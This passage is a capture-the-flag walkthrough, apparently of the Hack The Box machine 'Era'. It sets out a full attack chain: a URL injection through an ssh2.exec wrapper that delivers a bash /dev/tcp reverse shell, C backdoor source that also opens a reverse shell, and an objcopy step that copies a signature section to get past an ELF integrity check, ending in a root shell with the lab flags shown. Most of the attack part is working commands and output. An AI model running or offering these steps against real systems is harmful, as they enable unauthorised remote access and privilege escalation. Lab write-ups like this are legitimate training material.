> You can either use this or [pwncat](https://github.com/calebstewart/pwncat) or even [penelope](https://github.com/brightio/penelope).

We gonna use this one `bash -c 'bash -i >& /dev/tcp/10.10.16.22/3333 0>&1;true'` to get a reverse shell.

```bash
http://file.era.htb/download.php?id=8052&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.22%2F3333%200%3E%261;true%27
```

BOOM! We got a reverse shell.

```bash
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.16.22] from (UNKNOWN) [10.129.198.181] 40698
bash: cannot set terminal process group (5132): Inappropriate ioctl for device
bash: no job control in this shell
eric@era:~$ ls -la
ls -la
total 28
drwxr-x--- 5 eric eric 4096 Jul 22 08:42 .
drwxr-xr-x 4 root root 4096 Jul 22 08:42 ..
lrwxrwxrwx 1 root root    9 Jul  2 09:15 .bash_history -> /dev/null
-rw-r--r-- 1 eric eric 3771 Jan  6  2022 .bashrc
drwx------ 2 eric eric 4096 Sep 17  2024 .cache
drwxrwxr-x 3 eric eric 4096 Jul 22 08:42 .local
drwx------ 2 eric eric 4096 Sep 17  2024 .ssh
-rw-r----- 1 root eric   33 Jul 28 14:55 user.txt
eric@era:~$ cat user.txt
cat user.txt
0b03d09e6b5ea3b0e5296f1e165dca56
```

Nailed the `user.txt` flag.

I have tried the [penelope](https://github.com/brightio/penelope) and it works.

```bash
└─$ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 10.10.16.26
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from era~10.129.253.96-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/era~10.129.253.96-Linux-x86_64/2025_07_31-11_49_59-998.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

But for [pwncat](https://github.com/calebstewart/pwncat), it is quite old so maybe during the installation, it will conflict with dependencies so I prefer [penelope](https://github.com/brightio/penelope) instead.

## Initial Access
After we got into `eric` user, we doing some recon and found out these interesting things.

### Discovering and Group Permission
```bash
eric@era:~$ id
id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

```bash
eric@era:/opt/AV/periodic-checks$ ls -la
ls -la
total 32
drwxrwxr-- 2 root devs  4096 Jul 28 15:31 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Jul 28 15:31 monitor
-rw-rw---- 1 root devs   205 Jul 28 15:31 status.log
```

So we know that `eric` is a member of `devs` group and there a `monitor` file that is for `root` but there is `rw` permission for `devs` group. <br>
&rarr; We can leverage this **write** permission to perform our exploit later.

If we recall back there is a file that mentions in `singing.zip` file that we know there is `ELF Verification` system. <br>
&rarr; From this, we will trying to create a **backdoor** that contain our reverse shell code.

## Privilege Escalation
### Backdoor
First let's create a `backdoor.c` file based on `C` code.

```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.22/9999 0>&1'");
    return 0;
}
```

Then compile static binary.

```bash
eric@era:/tmp$ gcc -static -o monitor_backdoor backdoor.c
gcc -static -o monitor_backdoor backdoor.c
```

Next up, we gonna use [objcopy](https://man7.org/linux/man-pages/man1/objcopy.1.html) to create a signature for our backdoor.

### Binary signature bypass
We need to extract signature section from `monitor` file.

```bash
eric@era:/tmp$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
<ction .text_sig=sig /opt/AV/periodic-checks/monitor
eric@era:/tmp$ ls -la sig
ls -la sig
-rw-rw-r-- 1 eric eric 458 Jul 28 15:46 sig
```

After that, we gonna add signature to our backdoor.

```bash
eric@era:/tmp$ objcopy --add-section .text_sig=sig monitor_backdoor
objcopy --add-section .text_sig=sig monitor_backdoor
```

Then we gonna setup our kali listener.

```bash
└─$ nc -lvnp 9999
listening on [any] 9999 ...
```

Now we will replace the original `monitor` file with our backdoor.

```bash
eric@era:/tmp$ cp monitor_backdoor /opt/AV/periodic-checks/monitor
cp monitor_backdoor /opt/AV/periodic-checks/monitor
```

Waiting for a second, for my case it took about 30 seconds to 1 minute.

```bash
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.22] from (UNKNOWN) [10.129.198.181] 57822
bash: cannot set terminal process group (5881): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# ls -la
ls -la
total 64
drwx------  5 root root  4096 Jul 28 15:59 .
drwxr-xr-x 20 root root  4096 Jul 22 08:41 ..
lrwxrwxrwx  1 root root     9 Jul  2 09:15 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Oct 15  2021 .bashrc
drwx------  4 root root  4096 Sep 19  2024 .cache
lrwxrwxrwx  1 root root     9 Jan 25  2025 .lesshst -> /dev/null
drwxr-xr-x  3 root root  4096 Sep 17  2024 .local
lrwxrwxrwx  1 root root     9 Sep 17  2024 .selected_editor -> /dev/null
lrwxrwxrwx  1 root root     9 Sep 17  2024 .sqlite_history -> /dev/null
drwx------  2 root root  4096 Dec 15  2024 .ssh
-rw-r--r--  1 root root   165 Jul  2 09:14 .wget-hsts
-rwxr-x---  1 root root   654 Jul  1 14:10 answers.sh
-rwxr-x---  1 root root   195 Jul  1 14:03 clean_monitor.sh
-rwxr-x---  1 root root  1070 Jul  1 13:48 initiate_monitoring.sh
-rwxr-----  1 root root 16544 Jan 26  2025 monitor
-rw-r-----  1 root root    33 Jul 28 14:55 root.txt
root@era:~# cat root.txt
cat root.txt
44f605ebc62470f16a372c9045e53173
```

Got the reverse shell as `root` user. <br>
Grab the `root.txt` flag.

> For the setup listener part, we can also try [penelope](https://github.com/brightio/penelope) to catch the reverse shell.

> For the `root` part: The key is that this machine uses the third party software for monitoring and it run like `cronjob` so we can leverage this point to evade the signature check and get a reverse shell.

![result](/assets/img/era-htb-season8/result.png)